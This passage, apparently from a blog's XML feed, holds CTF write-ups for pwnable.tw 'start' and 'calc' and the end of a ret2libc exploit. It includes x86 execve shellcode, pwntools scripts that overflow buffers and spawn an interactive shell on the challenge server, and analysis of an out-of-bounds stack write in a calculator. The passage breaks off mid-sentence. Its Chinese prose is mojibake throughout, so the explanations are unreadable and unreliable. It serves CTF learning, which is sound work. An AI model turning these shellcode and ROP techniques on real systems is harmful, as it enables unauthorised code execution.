class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(pop_rdi) + p64(puts_got)+ p64(puts_plt)+ p64(stop_gadget)<span class="comment">#We can leak the real addr of puts in the libc</span></span><br><span class="line">p.send(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line">output = output[:output.index(<span class="string">&quot;\nWelCome&quot;</span>)].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_addr = u64(output)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(pop_rdi) + p64(bin_addr)+ p64(sys_addr)+ p64(stop_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â€‹        </p>]]></content>
      
      
      
        <tags>
            
            <tag> StackOverflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw (start &amp; calc)</title>
      <link href="2020/07/25/pwnable/"/>
      <url>2020/07/25/pwnable/</url>
      
        <content type="html"><![CDATA[<p>â€‹        æœ€è¿‘è¾¹çœ‹ä¹¦è¾¹åˆ·pwnable.twï¼Œè®°å½•ä¸€ä¸‹write upã€‚<span id="more"></span></p><h2 id="0x00-start"><a href="#0x00-start" class="headerlink" title="0x00 . start"></a>0x00 . start</h2><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>â€‹        ä¹‹å‰çœ‹è¿™ä¸ªé¢˜çš„æ—¶å€™ä¸€è„¸æ‡µé€¼ï¼Œäº‹éš”ç»å¹´æ„Ÿè§‰è²Œä¼¼èƒ½åšã€‚ã€‚ã€‚</p><p>â€‹        ç¨‹åºé‡Œåªæœ‰ä¸€ä¸ªæµ“çœ‰å¤§çœ¼çš„startå‡½æ•°ï¼š</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        å…¶å®å·®ä¸å¤šæ˜¯è¿™ä¸¤è¡Œä»£ç ï¼Œä¸€ä¸ªè¾“å‡ºä¸€ä¸ªè¾“å…¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp = <span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>;</span><br><span class="line">write(<span class="number">1</span>,esp,<span class="number">0x14</span>);</span><br><span class="line">read(<span class="number">0</span>,esp,<span class="number">0x3C</span>);</span><br></pre></td></tr></table></figure><p>â€‹        è€Œä¸”æ²¡NXä¿æŠ¤ï¼š</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        é‚£æœæ–­shellcodeå‘—ã€‚è™½ç„¶ä¸çŸ¥é“æ ˆåº•çš„ä½ç½®ï¼Œä½†å¯ä»¥æ‰¾åˆ°startå‡½æ•°ç»“æŸæ—¶æ‰§è¡Œäº†â€add esp,14hâ€çš„æ±‡ç¼–è¯­å¥ï¼Œå¯ä»¥çŒœæµ‹æ ˆçš„å¤§å°ä¸º0x14ï¼Œå› ä¸ºæ ˆé¡¶å°±æ˜¯æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„åœ°æ–¹ï¼Œæ‰€ä»¥paddingçš„å¤§å°ä¹Ÿæ˜¯è¿™ä¹ˆå¤šã€‚</p><p>â€‹        ä¸è¿‡ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶ï¼Œè¦å…ˆè¿”å›åˆ°0x08048087è¿™ä¸ªåœ°å€ï¼Œæ­¤æ—¶æ ˆå¸§å·²ç»æ”¶å›ï¼Œå†ä¸€æ¬¡æ‰§è¡Œwrite(1,esp,0x14)ï¼Œå°±èƒ½leakå‡ºæ ˆåº•åœ°å€äº†ã€‚</p><p>â€‹        ç¬¬äºŒæ¬¡è¾“å…¥ï¼Œå†å°†è¿”å›åœ°å€æ”¹æˆæ ˆåº•+0x14ï¼Œä¹Ÿå°±æ˜¯shellcodeçš„å¼€å¤´åœ°å€ï¼Œå³å¯æ‰§è¡Œshellcodeã€‚</p><p>â€‹        ç„¶åå¼€å§‹å†™shellcodeï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">push ecx; <span class="comment">#å­—ç¬¦ä¸²ç»“å°¾</span></span><br><span class="line">push 0x68732f6e; <span class="comment">#&#x27;n/sh&#x27;</span></span><br><span class="line">push 0x69622f2f; <span class="comment">#&#x27;//bi&#x27;</span></span><br><span class="line">mov ebx,esp;</span><br><span class="line">mov eax,0xb;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure><p>â€‹        ç„¶åpythonè½¬æœºå™¨æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;xor ecx,ecx;xor edx,edx;push ecx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure><p>â€‹        ç„¶åè·‘payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Here is addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm:</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x68732f6e;</span></span><br><span class="line"><span class="string">push 0x69622f2f;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0xb;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov eax,0xb;int 0x80&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(stack_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x01-calc"><a href="#0x01-calc" class="headerlink" title="0x01 . calc"></a>0x01 . calc</h2><h3 id="A-Analysis-1"><a href="#A-Analysis-1" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>â€‹        ä¾‹è¡Œå…¬äº‹å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        ä¸»è¦çš„å‡½æ•°æ˜¯calc()ï¼Œåˆ†åˆ«åˆå®ç°äº†get_expr(),init_pool(),parse()ä¸‰ä¸ªå‡½æ•°ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        get_expr()æ¥å—ç”¨æˆ·è¾“å…¥è®¡ç®—è¡¨è¾¾å¼ï¼Œå¹¶è¿‡æ»¤æ‰é™¤äº†â€œ+-*ã€%0123456789â€ä¹‹å¤–çš„å­—ç¬¦ï¼Œinit_pool()ç”³è¯·å †å—æ¥å­˜æ”¾æ•°ç»„å¹¶ä¸”åˆå§‹åŒ–ï¼Œç¨‹åºä¸­çš„è‹¥å¹²ä¸ªè¿ç®—æ•°å°±è¢«å­˜æ”¾åœ¨è¿™ä¸ªæ•°ç»„ä¸­ï¼Œparse()è¿›è¡Œè¡¨è¾¾å¼çš„è§£æå¹¶ä¸”è¿ç®—ã€‚</p><p>â€‹        ä¸»è¦æ¥çœ‹çœ‹parseå‡½æ•°çš„æ‰§è¡Œæœºåˆ¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> str, _DWORD *num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> <span class="keyword">operator</span>[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v5 = str;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  bzero(<span class="keyword">operator</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(i + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + str - v5;</span><br><span class="line">      s1 = <span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v5, v2);</span><br><span class="line">      s1[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*num)++;</span><br><span class="line">        num[v4 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + str) &amp;&amp; (*(i + <span class="number">1</span> + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v5 = i + <span class="number">1</span> + str;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">operator</span>[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(i + str) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">operator</span>[j] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; <span class="keyword">operator</span>[j] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">              <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">operator</span>[++j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">            <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//Check Point</span></span><br><span class="line">      <span class="keyword">if</span> ( !*(i + str) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( j &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹        å¤§æ„æ˜¯éå†æ¯ä¸ªå­—ç¬¦ï¼ŒæŠŠæ¯ä¸ªè¿ç®—æ•°ä¿å­˜åœ¨numæ•°ç»„(æ­¤å¤„numçš„ä¼ å‚æ˜¯intå‹ï¼Œå› æ­¤åé¢æ•°ç»„èµ‹å€¼å‡ç”¨æŒ‡é’ˆå¯»å€)ï¼Œè€Œä¸”ä»ä¸‹æ ‡[1]å¼€å§‹ä¿å­˜ï¼Œnum[0]åˆ™ç”¨æ¥å®æ—¶ä¿å­˜æ“ä½œæ•°çš„ä¸ªæ•°ã€‚æ¯ä¸€ä¸ªè¿ç®—ç¬¦è¢«å­˜äºoperatoræ•°ç»„ä¸­ã€‚</p><p>â€‹        åœ¨ç…ç…å®é™…ç”¨æ¥è¿›è¡Œè¿ç®—çš„eval()å‡½æ•°ï¼š</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        è¿ç®—æ–¹å¼ä¸º:ç”¨num[0]å½“ä½œä¸‹æ ‡æ‰¾å¯¹åº”çš„è¿ç®—æ•°ï¼Œå†å°†å…¶ä¸å‰é¢çš„è¿ç®—æ•°(å³num[num[0]-1])è¿›è¡Œè®¡ç®—ï¼Œç»“æœè¿”å›åˆ°åè€…ã€‚</p><p>â€‹        ä¸¾ä¾‹ï¼šè¾“å…¥1+3æ—¶ï¼Œnum[0] = 2ï¼Œnum[1] = 1ï¼Œnum[2] = 3</p><p>â€‹        è¿ç®—ä¹‹åï¼šnum[0] = 1ï¼Œnum[1] = 4ã€‚</p><p>â€‹        è€Œä¸”parseå‡½æ•°ä¸­çš„æ£€æŸ¥ç‚¹ä¼šæ£€æŸ¥num[0]æ˜¯å¦ä¸º0ã€‚</p><p>â€‹        è€Œè¿™é¢˜çš„<strong>æ¼æ´ç‚¹</strong>åœ¨evalå‡½æ•°é‡Œã€‚å‡½æ•°ä¸­è§„å®šæœ€åä¸€ä¸ªè¿ç®—æ•°ä¸å‰è€…è¿›è¡Œè¿ç®—ï¼Œä½†æ˜¯æ²¡æœ‰è€ƒè™‘è¿‡ç¬¬ä¸€ä¸ªè¿ç®—æ•°ä¸å­˜åœ¨çš„æƒ…å†µã€‚</p><p>â€‹        ä¸¾ä¾‹ï¼šè¾“å…¥+300æ—¶ï¼Œnum[0] = 1ï¼Œnum[1] = 300ï¼Œæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//num[1-1] += num[1]</span></span><br><span class="line"><span class="comment">//num[0] += num[1]</span></span><br></pre></td></tr></table></figure><p>â€‹        ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¾“å…¥çš„300ï¼Œé‚£ä¹ˆ301ä¼šè¢«å­˜æ”¾åœ¨num[0]ä¸­ï¼Œä½†æ˜¯num[0]è¿ç®—ç»“æŸå-1ï¼Œå› æ­¤ä»ç„¶æ˜¯300ã€‚è€Œåœ¨å‡½æ•°calcä¸­æˆ‘ä»¬çŸ¥é“ï¼Œnum[i-1]ä¼šè¢«ã€‚printfè¾“å‡ºï¼Œè€Œcalcä¸­çš„iç›¸å½“äºparseå’Œevalä¸­çš„num[0]ã€‚æœ€åè¾“å‡ºçš„æ˜¯calcå‡½æ•°ä¸­çš„num[299]ï¼Œç›¸å½“äºè¾“å‡ºäº†parseä¸­çš„num[300]ã€‚æ‰€ä»¥è¯´ï¼Œâ€+xâ€å¥å¼å¯ä»¥è¾¾æˆæ ˆä¸Šçš„ä»»æ„è¯»ã€‚</p><p>â€‹        å†ä¸¾ä¾‹ï¼šè¾“å…¥+300+1024æ—¶ï¼Œnum[0] = 2ï¼Œnum[1] = 300ï¼Œnum[2] = 1024ï¼Œä½†æ˜¯ä¸Šé¢æˆ‘ä»¬è¯´è¿‡ï¼Œç¬¬ä¸€æ­¥è¿ç®—ç»“æŸåï¼Œnum[0]ä¸º302ï¼Œè‡ªå‡åä¸º301ï¼Œå› æ­¤ä¹‹åä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//num[301-1] += num[2]</span></span><br><span class="line"><span class="comment">//num[300] += num[2]</span></span><br></pre></td></tr></table></figure><p>â€‹        æ‰€ä»¥æˆ‘ä»¬åœ¨num[2]ä¸­å†™çš„ä¸œè¥¿ï¼Œéƒ½ä¼šè¢«åŠ åˆ°num[300]é‡Œé¢ã€‚è¿™é‡Œçš„num[1]å’Œnum[2]éƒ½å¯æ§ï¼Œä¹Ÿå°±å®ç°äº†æ ˆä¸Šä»»æ„åœ°å€å†™ã€‚</p><h3 id="B-Attack"><a href="#B-Attack" class="headerlink" title="B . Attack"></a>B . Attack</h3><p>â€‹        è™½ç„¶ç¨‹åºåœ¨æ ˆä¸Šå¼€å¯äº†canaryï¼Œä½†æ˜¯ä¸Šè¿°çš„ä»»æ„åœ°å€å†™æ˜¯å®šå‘çš„ï¼Œä¸ä¼šç ´åcanaryã€‚ç¨‹åºè¿˜å¼€å¯äº†æ ˆä¸Šä¸å¯æ‰§è¡Œä¿æŠ¤ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡syscallè°ƒç”¨execveã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        0x5A0Ã·4 = 360ï¼Œæ‰€ä»¥num[0]åˆ°calcå‡½æ•°çš„æ ˆåº•ä¸º360ä¸ªå•ä½ã€‚æ ˆä¸Šç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /><p>â€‹        stack of mainä¸Šé¢éƒ½å±äºcalcçš„æ ˆå¸§ã€‚è€Œæˆ‘ä»¬è¦æ”¹å†™çš„ropé“¾å’Œæ ˆç»“æ„å¦‚ä¸‹ï¼š</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><p>â€‹        å…¶ä»–çš„æ”¹å†™éƒ½æ¯”è¾ƒç®€å•ï¼Œé‡ç‚¹åœ¨äºâ€œ/bin/shâ€å­—ç¬¦ä¸²ï¼Œè¦è®©å‡½æ•°æˆåŠŸè°ƒç”¨ï¼Œå°±ä¸èƒ½è®©ä»–å±äºcalcå‡½æ•°å’Œexecveå‡½æ•°çš„æ ˆå¸§ä¸­ï¼Œä»¥å…è¢«æ¸…ç©ºã€‚æ‰€ä»¥å†™åœ¨äº†int 80åœ°å€çš„åé¢ã€‚</p><p>â€‹        é‚£ä¹ˆå¦‚ä½•æ±‚å‡ºè¿™ä¸ªåœ°å€å‘¢ï¼Ÿç”±ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹å‡ºcalcæ ˆå¸§ä¸­çš„old ebpæˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»å‡ºæ¥ï¼Œå› ä¸ºè°ƒç”¨calcçš„ä¸Šå±‚å‡½æ•°æ˜¯mainï¼Œæ‰€ä»¥è¿™ä¸ªold ebpå°±æ˜¯mainå‡½æ•°çš„ebpã€‚äºæ˜¯æˆ‘ä»¬çŸ¥é“äº†æ 